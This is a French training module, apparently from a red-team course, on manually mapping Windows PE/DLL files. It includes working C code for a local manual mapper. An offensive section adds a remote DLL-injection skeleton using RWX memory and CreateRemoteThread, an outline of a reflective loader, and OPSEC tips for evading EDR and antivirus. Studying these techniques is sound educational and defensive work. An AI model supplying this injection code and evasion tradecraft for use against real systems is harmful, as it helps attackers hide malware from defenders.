# Chargement PE (Manual Mapping)

## Objectifs pédagogiques

À la fin de ce module, vous serez capable de :
- Comprendre le processus complet de chargement d'un PE par Windows
- Implémenter un loader PE manuel (Manual Mapping)
- Résoudre l'Import Address Table programmatiquement
- Appliquer les base relocations
- Gérer TLS callbacks et point d'entrée
- Créer un injecteur DLL utilisant Manual Mapping

## Prérequis

Avant de commencer ce module, assurez-vous de maîtriser :
- Le format PE (module W11_pe_format)
- Le parsing PE (module W12_pe_parsing)
- Les concepts de mémoire virtuelle Windows
- L'injection basique de DLL

## Introduction

Le **chargement PE** est le processus par lequel Windows charge un exécutable ou une DLL en mémoire et le prépare pour l'exécution. Comprendre ce processus permet d'implémenter le **Manual Mapping** : charger un PE sans passer par les APIs standards (LoadLibrary), ce qui rend l'injection invisible à de nombreux systèmes de détection.

### Pourquoi ce sujet est important ?

```ascii
MANUAL MAPPING = INJECTION FURTIVE

┌────────────────────────────────────────────────────┐
│  LIMITATIONS DE LoadLibrary()                      │
│  ├─ Enregistrement dans le PEB (visible)           │
│  ├─ Appel de DllMain (détectable)                  │
│  ├─ Hooks de ntdll.dll (EDR)                       │
│  ├─ Événements ETW générés                         │
│  └─ Trace dans VAD (Virtual Address Descriptors)   │
├────────────────────────────────────────────────────┤
│  AVANTAGES DU MANUAL MAPPING                       │
│  ├─ PAS d'enregistrement dans PEB->Ldr             │
│  ├─ Bypass hooks de LdrLoadDll                     │
│  ├─ DLL invisible aux énumérations standards       │
│  ├─ Contrôle total du processus de loading         │
│  └─ Évite Event Tracing for Windows (ETW)         │
├────────────────────────────────────────────────────┤
│  USAGES OFFENSIFS                                  │
│  ├─ Injection DLL furtive                          │
│  ├─ Bypass d'EDR/AV                                │
│  ├─ Chargement de shellcode complexe               │
│  └─ Reflective DLL Injection                       │
└────────────────────────────────────────────────────┘

Analogie : LoadLibrary = entrer par la porte principale (gardien)
           Manual Mapping = entrer par une fenêtre (invisible)
```

## Concepts fondamentaux

### Concept 1 : Processus de chargement standard Windows

Le loader Windows (ntdll!LdrLoadDll) effectue plusieurs étapes :

```ascii
CHARGEMENT STANDARD D'UNE DLL :

1. LdrLoadDll appelé
   ↓
2. Vérifier si déjà chargée (PEB->Ldr->InLoadOrderModuleList)
   ↓
3. Ouvrir le fichier .dll
   ↓
4. Mapper fichier en mémoire (NtCreateSection + NtMapViewOfSection)
   ↓
5. Allouer mémoire à ImageBase préférée (ou ailleurs si ASLR)
   ↓
6. Copier headers PE
   ↓
7. Copier sections (.text, .data, .rdata...)
   ↓
8. Traiter les relocations (si ImageBase différente)
   ↓
9. Résoudre les imports (remplir IAT)
   ↓
10. Exécuter TLS callbacks
   ↓
11. Changer protections mémoire (RWX → RX, etc.)
   ↓
12. Enregistrer dans PEB->Ldr (VISIBLE !)
   ↓
13. Appeler DllMain(DLL_PROCESS_ATTACH)
   ↓
14. Module chargé et fonctionnel

┌──────────────────────────────────────┐
│ ARTEFACTS LAISSÉS PAR LOADLIBRARY    │
│ ├─ Entrée dans PEB->Ldr              │
│ ├─ VAD entry (Virtual Address Desc.) │
│ ├─ Handle dans HANDLE table          │
│ ├─ ETW events                        │
│ └─ Hooks EDR déclenchés              │
└──────────────────────────────────────┘
```

### Concept 2 : Manual Mapping - Vue d'ensemble

Le Manual Mapping reproduit le chargement sans passer par les APIs standards :

```ascii
MANUAL MAPPING PROCESS :

┌──────────────────────────────────────────┐
│ PHASE 1: PRÉPARATION                     │
│ ├─ Lire fichier PE sur disque            │
│ ├─ Parser headers (DOS, NT, Sections)    │
│ └─ Valider le PE                         │
├──────────────────────────────────────────┤
│ PHASE 2: ALLOCATION                      │
│ ├─ VirtualAllocEx dans processus cible   │
│ ├─ Taille = OptionalHeader.SizeOfImage   │
│ └─ Permissions initiales: RW             │
├──────────────────────────────────────────┤
│ PHASE 3: COPIE                           │
│ ├─ Copier headers (SizeOfHeaders)        │
│ ├─ Copier chaque section                 │
│ │   Src: file[PointerToRawData]          │
│ │   Dst: mem[VirtualAddress]             │
│ └─ WriteProcessMemory pour injection     │
├──────────────────────────────────────────┤
│ PHASE 4: RELOCATIONS                     │
│ ├─ Si ImageBase différente               │
│ ├─ Parser Relocation Table               │
│ └─ Patcher chaque adresse                │
├──────────────────────────────────────────┤
│ PHASE 5: RÉSOLUTION IMPORTS              │
│ ├─ Parser Import Table                   │
│ ├─ LoadLibrary(DLL) + GetProcAddress(fn) │
│ └─ Remplir IAT avec adresses réelles     │
├──────────────────────────────────────────┤
│ PHASE 6: PROTECTIONS                     │
│ ├─ VirtualProtectEx sur chaque section   │
│ │   .text → PAGE_EXECUTE_READ            │
│ │   .rdata → PAGE_READONLY               │
│ │   .data → PAGE_READWRITE               │
│ └─ Éviter PAGE_EXECUTE_READWRITE (flagg) │
├──────────────────────────────────────────┤
│ PHASE 7: TLS & ENTRYPOINT                │
│ ├─ Exécuter TLS callbacks (si présents)  │
│ ├─ Appeler DllMain (CreateRemoteThread)  │
│ └─ DLL opérationnelle                    │
└──────────────────────────────────────────┘

RÉSULTAT : DLL chargée SANS trace dans PEB->Ldr
```

### Concept 3 : Base Relocations

Lorsque le PE ne peut pas être chargé à son ImageBase préférée, il faut patcher les adresses :

```ascii
POURQUOI LES RELOCATIONS ?

Code compilé avec ImageBase = 0x10000000 :

mov rax, [0x10001234]  ; Adresse absolue

Si chargé à 0x20000000 à cause d'ASLR :
mov rax, [0x10001234]  ; ✗ MAUVAISE ADRESSE !

Il faut patcher :
mov rax, [0x20001234]  ; ✓ Corrigée

┌──────────────────────────────────────┐
│ RELOCATION TABLE STRUCTURE           │
│                                      │
│ .reloc section contient des blocks : │
│                                      │
│ Block 1: PageRVA = 0x1000            │
│   Entries:                           │
│   - Type: DIR64, Offset: 0x234       │
│     → Patcher RVA 0x1234             │
│   - Type: DIR64, Offset: 0x456       │
│     → Patcher RVA 0x1456             │
│                                      │
│ Block 2: PageRVA = 0x2000            │
│   Entries: ...                       │
└──────────────────────────────────────┘

FORMULE DE RELOCATION :
Delta = NewImageBase - OriginalImageBase
Pour chaque entrée :
  *AdresseARelocaliser += Delta
```

### Concept 4 : Résolution des imports

```ascii
IMPORT ADDRESS TABLE (IAT) RESOLUTION

AVANT RÉSOLUTION (sur disque) :
┌────────────────────────────────────┐
│ IAT contient des RVAs vers noms :  │
│ [0x00401000] → RVA(CreateFileA)    │
│ [0x00401008] → RVA(ReadFile)       │
│ [0x00401010] → RVA(WriteFile)      │
└────────────────────────────────────┘

APRÈS RÉSOLUTION (en mémoire) :
┌────────────────────────────────────┐
│ IAT contient adresses réelles :    │
│ [0x00401000] → 0x7FFE12345678      │ ← kernel32!CreateFileA
│ [0x00401008] → 0x7FFE1234ABCD      │ ← kernel32!ReadFile
│ [0x00401010] → 0x7FFE1234DEF0      │ ← kernel32!WriteFile
└────────────────────────────────────┘

PROCESSUS :
1. Parser Import Directory
2. Pour chaque DLL importée :
   a. GetModuleHandle(dllName) ou LoadLibrary(dllName)
   b. Pour chaque fonction :
      - GetProcAddress(dllHandle, funcName)
      - Écrire adresse dans IAT
```

## Mise en pratique

### Étape 1 : Allouer et copier le PE

```c
#include <windows.h>
#include <stdio.h>

typedef BOOL (*DllMainFunc)(HINSTANCE, DWORD, LPVOID);

// Allouer mémoire et copier sections
LPVOID map_pe_sections(LPVOID pFileBuffer, SIZE_T* outImageSize) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pFileBuffer + pDosHeader->e_lfanew);

    // Valider PE
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE ||
        pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Allouer mémoire (SizeOfImage)
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    LPVOID pImageBase = VirtualAlloc(NULL, imageSize,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!pImageBase) {
        return NULL;
    }

    *outImageSize = imageSize;

    // Copier headers
    memcpy(pImageBase, pFileBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Copier sections
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSectionHeader[i].SizeOfRawData == 0) continue; // Section .bss

        LPVOID pDestSection = (LPVOID)((BYTE*)pImageBase + pSectionHeader[i].VirtualAddress);
        LPVOID pSrcSection = (LPVOID)((BYTE*)pFileBuffer + pSectionHeader[i].PointerToRawData);

        memcpy(pDestSection, pSrcSection, pSectionHeader[i].SizeOfRawData);
    }

    return pImageBase;
}
```

### Étape 2 : Appliquer les relocations

```c
BOOL apply_relocations(LPVOID pImageBase, ULONGLONG preferredBase) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);

    ULONGLONG originalBase = pNtHeaders->OptionalHeader.ImageBase;
    LONGLONG delta = (LONGLONG)((ULONGLONG)pImageBase - originalBase);

    // Si chargé à ImageBase préférée, pas besoin de relocations
    if (delta == 0) {
        return TRUE;
    }

    // Vérifier si relocations disponibles
    DWORD relocRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocSize = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    if (relocRVA == 0 || relocSize == 0) {
        printf("Erreur: Pas de relocation table (fichier doit être chargé exactement à 0x%llX)\n", originalBase);
        return FALSE;
    }

    PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pImageBase + relocRVA);

    // Parser chaque block
    DWORD offset = 0;
    while (offset < relocSize && pReloc->SizeOfBlock > 0) {
        DWORD numEntries = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* entries = (WORD*)((BYTE*)pReloc + sizeof(IMAGE_BASE_RELOCATION));

        for (DWORD i = 0; i < numEntries; i++) {
            WORD entry = entries[i];
            WORD type = entry >> 12;        // 4 bits de type
            WORD offset = entry & 0xFFF;    // 12 bits d'offset

            if (type == IMAGE_REL_BASED_ABSOLUTE) {
                // Padding, ignorer
                continue;
            }

            ULONGLONG* pPatchAddr = (ULONGLONG*)((BYTE*)pImageBase + pReloc->VirtualAddress + offset);

            switch (type) {
                case IMAGE_REL_BASED_DIR64:   // 64-bit
                    *pPatchAddr += delta;
                    break;
                case IMAGE_REL_BASED_HIGHLOW: // 32-bit
                    *(DWORD*)pPatchAddr += (DWORD)delta;
                    break;
                case IMAGE_REL_BASED_HIGH:
                    *(WORD*)pPatchAddr += HIWORD(delta);
                    break;
                case IMAGE_REL_BASED_LOW:
                    *(WORD*)pPatchAddr += LOWORD(delta);
                    break;
                default:
                    printf("Type relocation inconnu: %d\n", type);
            }
        }

        offset += pReloc->SizeOfBlock;
        pReloc = (PIMAGE_BASE_RELOCATION)((BYTE*)pReloc + pReloc->SizeOfBlock);
    }

    // Mettre à jour ImageBase dans headers
    pNtHeaders->OptionalHeader.ImageBase = (ULONGLONG)pImageBase;

    return TRUE;
}
```

### Étape 3 : Résoudre les imports

```c
BOOL resolve_imports(LPVOID pImageBase) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);

    DWORD importRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (importRVA == 0) {
        return TRUE; // Pas d'imports
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)pImageBase + importRVA);

    // Parser chaque DLL
    while (pImportDesc->Name != 0) {
        char* dllName = (char*)((BYTE*)pImageBase + pImportDesc->Name);

        // Charger DLL (ou récupérer handle si déjà chargée)
        HMODULE hModule = LoadLibraryA(dllName);
        if (!hModule) {
            printf("Erreur: impossible de charger '%s'\n", dllName);
            return FALSE;
        }

        // Parser fonctions
        PIMAGE_THUNK_DATA pOrigThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImportDesc->OriginalFirstThunk);
        PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)pImageBase + pImportDesc->FirstThunk);

        while (pOrigThunk->u1.AddressOfData != 0) {
            FARPROC funcAddress = NULL;

            // Import par ordinal ou par nom ?
            if (pOrigThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
                // Import par ordinal
                WORD ordinal = IMAGE_ORDINAL64(pOrigThunk->u1.Ordinal);
                funcAddress = GetProcAddress(hModule, (LPCSTR)ordinal);

                if (!funcAddress) {
                    printf("Erreur: fonction ordinal %d introuvable dans %s\n", ordinal, dllName);
                }
            } else {
                // Import par nom
                PIMAGE_IMPORT_BY_NAME pImport = (PIMAGE_IMPORT_BY_NAME)((BYTE*)pImageBase + pOrigThunk->u1.AddressOfData);
                funcAddress = GetProcAddress(hModule, (LPCSTR)pImport->Name);

                if (!funcAddress) {
                    printf("Erreur: fonction '%s' introuvable dans %s\n", pImport->Name, dllName);
                }
            }

            if (!funcAddress) {
                return FALSE;
            }

            // Écrire adresse dans IAT
            pFirstThunk->u1.Function = (ULONGLONG)funcAddress;

            pOrigThunk++;
            pFirstThunk++;
        }

        pImportDesc++;
    }

    return TRUE;
}
```

### Étape 4 : Appliquer les protections mémoire

```c
BOOL apply_section_protections(LPVOID pImageBase) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID pSection = (LPVOID)((BYTE*)pImageBase + pSectionHeader[i].VirtualAddress);
        SIZE_T sectionSize = pSectionHeader[i].Misc.VirtualSize;
        DWORD characteristics = pSectionHeader[i].Characteristics;

        // Déterminer protection
        DWORD protection = PAGE_NOACCESS;

        if (characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (characteristics & IMAGE_SCN_MEM_WRITE) {
                protection = PAGE_EXECUTE_READWRITE; // RWX (suspect !)
            } else if (characteristics & IMAGE_SCN_MEM_READ) {
                protection = PAGE_EXECUTE_READ; // RX
            } else {
                protection = PAGE_EXECUTE; // X seulement (rare)
            }
        } else if (characteristics & IMAGE_SCN_MEM_WRITE) {
            if (characteristics & IMAGE_SCN_MEM_READ) {
                protection = PAGE_READWRITE; // RW
            } else {
                protection = PAGE_WRITECOPY; // W seulement (rare)
            }
        } else if (characteristics & IMAGE_SCN_MEM_READ) {
            protection = PAGE_READONLY; // R
        }

        DWORD oldProtect;
        if (!VirtualProtect(pSection, sectionSize, protection, &oldProtect)) {
            printf("Erreur VirtualProtect pour section %.8s\n", pSectionHeader[i].Name);
            return FALSE;
        }
    }

    return TRUE;
}
```

### Étape 5 : Exécuter TLS callbacks et DllMain

```c
BOOL execute_tls_callbacks(LPVOID pImageBase) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);

    DWORD tlsRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if (tlsRVA == 0) {
        return TRUE; // Pas de TLS
    }

    PIMAGE_TLS_DIRECTORY pTls = (PIMAGE_TLS_DIRECTORY)((BYTE*)pImageBase + tlsRVA);
    PIMAGE_TLS_CALLBACK* pCallbackArray = (PIMAGE_TLS_CALLBACK*)pTls->AddressOfCallBacks;

    if (pCallbackArray) {
        for (int i = 0; pCallbackArray[i] != NULL; i++) {
            pCallbackArray[i]((LPVOID)pImageBase, DLL_PROCESS_ATTACH, NULL);
        }
    }

    return TRUE;
}

BOOL call_entrypoint(LPVOID pImageBase) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);

    DWORD entryRVA = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    if (entryRVA == 0) {
        return TRUE; // Pas de point d'entrée (rare pour DLL)
    }

    DllMainFunc DllMain = (DllMainFunc)((BYTE*)pImageBase + entryRVA);

    BOOL result = DllMain((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);

    if (!result) {
        printf("DllMain a retourné FALSE\n");
        return FALSE;
    }

    return TRUE;
}
```

### Étape 6 : Programme complet - Manual Mapper local

```c
#include <windows.h>
#include <stdio.h>

BOOL manual_map_dll(const char* dllPath) {
    // 1. Lire fichier DLL
    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Erreur ouverture fichier\n");
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    LPVOID pFileBuffer = malloc(fileSize);

    DWORD bytesRead;
    ReadFile(hFile, pFileBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    // 2. Mapper sections en mémoire
    SIZE_T imageSize = 0;
    LPVOID pImageBase = map_pe_sections(pFileBuffer, &imageSize);
    if (!pImageBase) {
        printf("Erreur map_pe_sections\n");
        free(pFileBuffer);
        return FALSE;
    }

    printf("[+] DLL mappée à 0x%p (taille: 0x%zX)\n", pImageBase, imageSize);

    // 3. Appliquer relocations
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pImageBase + pDosHeader->e_lfanew);

    if (!apply_relocations(pImageBase, pNtHeaders->OptionalHeader.ImageBase)) {
        printf("Erreur apply_relocations\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        free(pFileBuffer);
        return FALSE;
    }

    printf("[+] Relocations appliquées\n");

    // 4. Résoudre imports
    if (!resolve_imports(pImageBase)) {
        printf("Erreur resolve_imports\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        free(pFileBuffer);
        return FALSE;
    }

    printf("[+] Imports résolus\n");

    // 5. Protections mémoire
    if (!apply_section_protections(pImageBase)) {
        printf("Erreur apply_section_protections\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        free(pFileBuffer);
        return FALSE;
    }

    printf("[+] Protections appliquées\n");

    // 6. TLS Callbacks
    execute_tls_callbacks(pImageBase);
    printf("[+] TLS callbacks exécutés\n");

    // 7. Appeler DllMain
    if (!call_entrypoint(pImageBase)) {
        printf("Erreur call_entrypoint\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        free(pFileBuffer);
        return FALSE;
    }

    printf("[+] DllMain(DLL_PROCESS_ATTACH) appelé avec succès\n");
    printf("[+] DLL chargée à 0x%p\n", pImageBase);

    free(pFileBuffer);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <dll_path>\n", argv[0]);
        return 1;
    }

    printf("=== MANUAL MAPPER ===\n");
    printf("DLL: %s\n\n", argv[1]);

    if (manual_map_dll(argv[1])) {
        printf("\n[SUCCESS] DLL chargée avec succès\n");
        printf("Appuyez sur Entrée pour quitter...\n");
        getchar();
    } else {
        printf("\n[FAIL] Échec du chargement\n");
    }

    return 0;
}
```

## Application offensive

### Contexte Red Team

Le Manual Mapping est une technique fondamentale en Red Team :

#### 1. Injection DLL furtive

```c
// Version injection distante (dans un autre processus)
BOOL inject_dll_manual_map(DWORD targetPID, const char* dllPath) {
    // 1. Ouvrir processus cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) return FALSE;

    // 2. Lire DLL depuis disque
    LPVOID pLocalBuffer = read_file_to_memory(dllPath);

    // 3. Allouer mémoire dans cible
    SIZE_T imageSize = get_pe_image_size(pLocalBuffer);
    LPVOID pRemoteImage = VirtualAllocEx(hProcess, NULL, imageSize,
                                         MEM_COMMIT | MEM_RESERVE,
                                         PAGE_EXECUTE_READWRITE);

    // 4. Écrire DLL dans cible (headers + sections)
    write_pe_to_remote(hProcess, pRemoteImage, pLocalBuffer);

    // 5. Allouer stub loader dans cible
    LPVOID pStub = VirtualAllocEx(hProcess, NULL, 4096,
                                  MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);

    // 6. Écrire stub qui fera reloc + resolve imports + call DllMain
    write_loader_stub(hProcess, pStub, pRemoteImage);

    // 7. Exécuter stub
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pStub,
                                        NULL, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);

    // 8. Cleanup stub (laisser DLL)
    VirtualFreeEx(hProcess, pStub, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}
```

#### 2. Reflective DLL Injection

Une variante où la DLL contient son propre loader :

```c
// Dans la DLL : fonction ReflectiveLoader exportée
__declspec(dllexport) DWORD WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // 1. Trouver sa propre base en mémoire (parcourir stack/headers)
    LPVOID pImageBase = find_own_base();

    // 2. Se relocate
    apply_relocations(pImageBase, 0);

    // 3. Résoudre ses imports
    resolve_imports(pImageBase);

    // 4. Appeler son vrai DllMain
    call_real_dllmain(pImageBase);

    return 0;
}

// Injection : juste écrire DLL + CreateRemoteThread sur ReflectiveLoader
```

#### 3. Bypass d'EDR

```ascii
POURQUOI MANUAL MAPPING BYPASS LES EDR ?

┌─────────────────────────────────────────┐
│ EDR HOOK POINTS STANDARDS               │
│ ├─ ntdll!LdrLoadDll                     │  ← BYPASSED
│ ├─ kernel32!LoadLibraryA/W              │  ← BYPASSED
│ ├─ ntdll!NtMapViewOfSection             │  ← Peut être détecté
│ └─ kernel32!CreateRemoteThread          │  ← Peut être détecté
├─────────────────────────────────────────┤
│ AMÉLIORATIONS OPSEC                     │
│ ├─ Utiliser syscalls directs            │
│ ├─ Thread hijacking au lieu CRT         │
│ ├─ Effacer PE headers après load        │
│ └─ Nettoyer call stack                  │
└─────────────────────────────────────────┘
```

### Considérations OPSEC

```ascii
DÉTECTIONS & MITIGATIONS

┌────────────────────────────────────────────┐
│ INDICATEURS DE MANUAL MAPPING              │
│ ├─ VirtualAllocEx RWX (très suspect)       │
│ ├─ WriteProcessMemory de gros blocs        │
│ ├─ CreateRemoteThread vers RWX            │
│ ├─ Module non enregistré dans PEB          │
│ └─ Memory pages orphelines (pas de VAD)    │
├────────────────────────────────────────────┤
│ BONNES PRATIQUES                           │
│ ✓ Allouer RW, écrire, puis changer en RX  │
│ ✓ Utiliser syscalls directs (bypass hooks)│
│ ✓ Thread hijacking > CreateRemoteThread   │
│ ✓ Effacer MZ/PE headers après chargement  │
│ ✓ Utiliser module stomping (remplacer DLL)│
│ ✓ Éviter LoadLibrary (utiliser LdrLoadDll)│
│ ✓ Parser IAT manuellement sans GetProc    │
└────────────────────────────────────────────┘

ALTERNATIVES PLUS FURTIVES :
- Module Stomping : remplacer DLL légitime déjà chargée
- Phantom DLL Hollowing : créger section puis unmap original
- Thread Execution Hijacking : pas de CreateRemoteThread
```

## Résumé

- Manual Mapping = charger un PE sans LoadLibrary
- Étapes : Alloc → Copy → Relocate → Resolve Imports → Protect → Execute
- Base Relocations : patcher adresses si ImageBase différente (delta)
- Import Resolution : LoadLibrary + GetProcAddress pour remplir IAT
- TLS Callbacks : exécuter avant DllMain
- Avantages : invisible dans PEB->Ldr, bypass hooks LdrLoadDll
- Inconvénients : plus détectable par heuristiques (RWX, WriteProcessMemory)
- OPSEC : utiliser syscalls, éviter RWX, effacer headers, thread hijacking

## Ressources complémentaires

- [Stephen Fewer's Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [Hasherezade's Manual Mapping Tutorial](https://github.com/hasherezade/libpeconv)
- [MSDN: PE Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
- [ired.team: Reflective DLL Injection](https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection)
- [Rasta Mouse: Process Injection Techniques](https://rastamouse.me/memory-patching-amsi-bypass/)

---

**Navigation**
- [Module précédent](../W12_pe_parsing/)
- [Module suivant](../W14_peb_teb/)
